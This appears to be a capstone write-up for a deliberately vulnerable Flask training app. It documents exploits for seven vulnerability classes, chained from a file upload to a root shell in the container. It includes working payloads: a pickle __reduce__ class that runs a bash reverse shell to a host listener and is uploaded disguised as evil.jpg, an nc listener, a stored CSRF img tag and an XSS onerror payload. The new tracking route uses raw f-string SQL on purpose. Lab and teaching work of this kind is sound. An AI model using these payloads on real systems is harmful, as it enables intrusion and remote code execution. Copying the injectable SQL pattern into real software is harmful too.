# phase 3: capstone, chain documented end to end

this is the last phase. all 7 vuln classes now have working, reproduced exploits, and the chain from "uploaded a file" to "root shell in the container" is captured start to finish. no hardening added anywhere, the app stays exploitation only per `AGENTS.md`.

## where things landed

| area | status | proof lives in |
|---|---|---|
| sensitive data exposure | done | `/users` dumps username/password/is_admin, no auth check |
| html injection | done | `safe` filter on post fields in the templates |
| stored xss | done | stored `onerror` payload fired `alert(1)` in a real browser |
| csrf | done | owner delete works, a second user gets `403`, a stored `<img>` fires the delete with no click |
| sql injection | done | `sql_injections.md`, real curl runs, both bypass variants |
| file upload | done | raw pickle bytes saved as `evil.jpg`, no content check anywhere |
| rce | done | admin preview deserialized the pickle, got a root shell back |

## the full chain

```text
attacker builds a pickle with __reduce__ -> os.system
  normal user uploads it as evil.jpg (no validation, sails right through)
  file lands in /app/uploads, path recorded in posts.image_path
  attacker logs in as admin
  admin opens /admin/preview/<post_id>
  pickle.load() runs, calls os.system
  bash connects back to the host listener
  shell, root, inside the container
```

every link in that chain was already documented separately, phase 3 is where they got run together for real instead of staying theoretical.

## the admin account, and why it matters here

registration decides `is_admin` off the username alone:

```python
if username == "admin":
    is_admin = True
else:
    is_admin = False
```

confirmed in the db:

```text
user_id: 1, username: alice, password: 123, is_admin: 0
user_id: 2, username: admin, password: admin, is_admin: 1
```

worth being explicit about the mental model here: the password never factors into the privilege decision, only the exact string `admin` does. that's a second, smaller vuln riding along with the rce chain, not something i'm trying to dress up as more than it is: anyone can self register as a privileged account just by typing the right username.

## payload, same one from the rce writeup

```python
class whatever:
    def __reduce__(self):
        import os
        return (
            os.system,
            ('bash -c "bash -i >& /dev/tcp/172.18.0.1/4444 0>&1"',)
        )
```

`pickle.dumps(whatever())` runs `__reduce__` locally, right when you build the payload, and bakes the result (call `os.system`, with this string) into the bytes. the server's `pickle.load()` never imports `whatever`, it just replays "call this function with this argument" straight out of the byte stream. saved as `evil.jpg`, extension's pure camouflage since `/upload` checks nothing.

## network side, worth separating from the app side

docker gateway confirmed at `172.18.0.1`, web container at `172.18.0.3`. listener:

```bash
nc -lnvp 4444
```

first attempt just hung: host firewall was dropping anything from the docker subnet. scoped fix, not a blanket "allow everything":

```bash
sudo ufw allow from 172.18.0.0/16 to any port 4444 proto tcp
```

before touching the actual exploit, confirmed the network path on its own:

```bash
docker exec vulnboard-web-1 python -c 'import socket; s=socket.create_connection(("172.18.0.1",4444),3); s.sendall(b"connected\n"); print("connected")'
```

this is the kind of check that pays for itself: if the real exploit fails later, you already know whether it's the network or the pickle, instead of debugging both at once.

## what came back

```text
Listening on 0.0.0.0 4444
Connection received on 172.18.0.3 33422
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@a0409df51b65:/app# id
uid=0(root) gid=0(root) groups=0(root)
root@a0409df51b65:/app# ls /app/uploads
evil.jpg
```

root inside the container, not root on the host, i want that distinction on record rather than overselling the result. the "ioctl" and "no job control" lines are just `nc` not allocating a pty, the commands still ran fine, you just lose tab completion and ctrl+c sanity.

## csrf, confirmed for real this time

`/deletepost/<id>` is a GET route with an ownership check and nothing else:

```python
@app.route("/deletepost/<int:post_id>")
def delete_post(post_id):
```

all three cases tested and matched expectations:

1. owner hits the url directly, post deleted
2. a different logged in user hits the same url, gets `403`
3. a stored `<img src="/deletepost/<id>">` fires on page load, no click, post gone

the ownership check answers "does this session own the post", not "did the owner mean to send this request", and that gap is the entire vulnerability. the victim's browser attaches their real session cookie automatically, so the check passes, the attacker never needed to steal anything.

## docs touched this phase

```text
writeups/sensitive-data-exposure/sensitive-data-exposure.md
writeups/xss/stored-xss.md
writeups/csrf/csrf.md
writeups/sql_injections/sql_injections.md
writeups/file-upload/file-upload.md
writeups/rce/exploit.py
writeups/rce/rce.md
README.md
```

html injection stayed folded into the stored xss writeup since both ride the same `safe` template boundary, splitting them into two files would've been documenting the same line of code twice.

readme now points at the real writeup folders and says `logic/` instead of the stale `app/` path that's been wrong since the package rename.

## loose end decisions

`delete_account()` now reads `request.form`, matching the POST form in `delete.html`. after rebuilding the web image, a temporary account completed registration with HTTP `302`, login with HTTP `302`, and account deletion with HTTP `302` instead of the old password required response.

The owner and administrator condition in `delete_post()` was reviewed and intentionally left unchanged. `post.user_id != session.user_id and not session.is_admin` denies only sessions that are neither the owner nor an administrator. changing `and` to `or` would break both valid owner and administrator cases.

The current `see.html` comparison is `session.get('user_id') == post.user_id` and controls the owner's delete link. it is live behavior, not the previously reported dead `session.get('id')` comparison.

## visitor tracking addition

the capstone also now includes a small first party page view tracker. it is deliberately simple: the browser sends the current path and referrer, Flask adds request metadata, and MySQL stores one row for each page view.

```text
DOMContentLoaded fires in index.html or see.html
    JavaScript reads window.location.pathname and document.referrer
    URLSearchParams packages them like an HTML form
    navigator.sendBeacon sends POST /track
    fetch with keepalive is the fallback when sendBeacon is unavailable
    Flask reads request.form, the User-Agent header, and request.remote_addr
    the tracking table stores the event and created_at timestamp
```

the important boundary is that JavaScript does not need to discover the IP address. it sends page data in the request body, while Flask receives the user agent from the browser header and the address from the network connection. this is a useful example of how a request contains both application data and transport metadata.

the route and schema are intentionally consistent with the rest of this exploitation only application. the insert uses the lab's raw f string SQL style, so the browser controlled tracking values also demonstrate why interpolating request data into SQL is unsafe. a production implementation would use parameterized SQL, limit retention, and avoid collecting more identifying data than necessary.

verification was split into two checks. first, a manual POST to `/track` confirmed that the backend inserted a row. second, opening `/see` in a browser created a row with `/see`, the browser user agent, the Docker bridge address, and the server timestamp. the same script is present on `/`, so both pages now produce tracking events.

this addition demonstrates client side telemetry without cookies or cross site correlation. the lab does not implement a consent flow, retention policy, or privacy notice. a real privacy preserving version would document the collection, obtain consent where required, avoid unnecessary identifiers, restrict access to the data, and define a short retention period. the mechanism is conceptually similar to the page view portion of larger analytics systems, but those systems add substantial collection, identity, and reporting layers.

The upload directory remains container local. no bind mount was added because `docker compose down -v` must remove the lab's uploaded files. the generated `evil.jpg` is removed and ignored, while `writeups/rce/exploit.py` remains as the deliberate teaching artifact.

## verification

| check | status |
|---|---|
| normal + admin accounts exist | confirmed |
| admin route reachable by admin account | confirmed |
| pickle payload generated | confirmed |
| arbitrary file saved in `/app/uploads` | confirmed |
| container reached host listener | confirmed |
| admin preview deserialized the upload | confirmed |
| root shell received | confirmed |
| owner csrf delete | confirmed |
| other user blocked, `403` | confirmed |
| stored csrf fired automatically | confirmed |
| rce + csrf writeups written | confirmed |
| readme links checked | confirmed |

## cleanup still owed

the ufw rule was for this demo only, not a standing hole:

```bash
sudo ufw delete allow from 172.18.0.0/16 to any port 4444 proto tcp
sudo ufw status
```

`writeups/rce/evil.jpg` is deliberately gitignored and removed from the working tree. the generator remains available as the teaching artifact, while generated payload bytes, session cookies, shell history, and scratch files stay out of the commit.

## the one sentence version

the whole chain works because the app trusts an upload to be an image in one place and trusts it to be safe python object data in another, and those are never the same promise. that gap, not any single line of code, is what a real fix has to close.